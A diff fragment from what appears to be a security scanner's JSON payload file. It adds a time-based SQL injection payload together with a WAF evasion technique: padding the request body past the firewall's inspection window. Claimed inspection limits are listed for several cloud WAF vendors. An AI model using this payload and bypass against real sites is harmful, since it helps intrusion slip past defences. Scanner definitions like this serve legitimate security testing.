@@ -344,6 +344,18 @@
           "severity": "high",
           "confidence_boost": 40,
           "variables": {}
+        },
+        {
+          "payload": "{{baseline}} AND SLEEP(5)-- -   # prepend junk>=WAF-limit before this",
+          "description": "WAF body-inspection-limit bypass: prepend junk data larger than the WAF's inspected window so the injection sits beyond it while the backend still parses the full body. Documented limits \u2014 Cloudflare 128KB, AWS 8-64KB, Akamai 8-128KB, Azure 128KB, Barracuda 64KB, GCP Armor 8KB. Send as a large POST/JSON body with a junk field first, the injectable param last; time-based oracle confirms.",
+          "matchers": [
+            {
+              "type": "timing",
+              "min_ms": 4500
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 40
         }
       ]
     },
